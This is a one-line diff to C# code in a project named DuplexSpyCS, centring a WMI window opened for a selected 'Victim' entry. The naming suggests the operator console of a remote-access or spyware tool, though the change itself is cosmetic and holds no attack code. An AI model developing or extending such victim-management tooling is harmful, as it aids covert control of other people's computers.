@@ -1865,6 +1865,7 @@ namespace DuplexSpyCS
             {
                 Victim v = GetVictim(item);
                 frmWMI f = new frmWMI();
+                f.StartPosition = FormStartPosition.CenterScreen;
                 f.Tag = Function.WMI;
                 f.v = v;
                 f.Text = $@"WMI\\{v.ID}";
